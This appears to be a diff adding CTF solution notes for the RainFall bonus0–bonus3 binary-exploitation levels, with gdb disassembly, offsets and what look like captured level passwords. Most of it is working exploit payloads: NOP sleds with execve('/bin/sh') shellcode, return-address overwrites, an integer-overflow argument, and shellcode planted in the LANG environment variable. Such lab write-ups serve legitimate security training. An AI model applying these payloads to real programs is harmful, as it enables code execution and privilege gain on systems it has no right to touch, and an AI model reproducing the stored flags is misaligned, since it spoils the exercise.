@@ -113,3 +113,68 @@ f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ================BONUS0========================
 ==============================================
 
+
+(gdb) b *p+28
+Breakpoint 1 at 0x80484d0
+(gdb) run
+Starting program: /home/user/bonus0/bonus0 
+ - 
+
+Breakpoint 1, 0x080484d0 in p ()
+
+(gdb) disass p
+Dump of assembler code for function p:
+   0x080484b4 <+0>:	push   %ebp
+   0x080484b5 <+1>:	mov    %esp,%ebp
+   0x080484b7 <+3>:	sub    $0x1018,%esp
+   0x080484bd <+9>:	mov    0xc(%ebp),%eax
+   0x080484c0 <+12>:	mov    %eax,(%esp)
+   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
+   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
+=> 0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
+
+
+
+(gdb) x $ebp-0x1008
+0xbfffe680:	0x00000000
+
+BFFFE6B8
+
+(python -c 'print "\x90" * 3000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c "print( 'A' * 14 + '\xb8\xe6\xff\xbf' + 'A')"; cat) | ~/bonus0
+
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+==============================================
+================BONUS1========================
+==============================================
+
+-2147483637
+0x574f4c46
+
+
+bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "a" * 40 + "\x46\x4c\x4f\x57"')
+
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+==============================================
+================BONUS2========================
+==============================================
+
+Offset = 18
+
+export LANG=$(python -c 'print "fi" + "\x90" * 300 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+
+0xbffffdf2
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "a" * 40') $(python -c 'print "a" * 18 + "\xf2\xfd\xff\xbf"')
+
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+==============================================
+================BONUS3========================
+==============================================
+
+bonus3@RainFall:~$ ./bonus3 ""
+
+
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
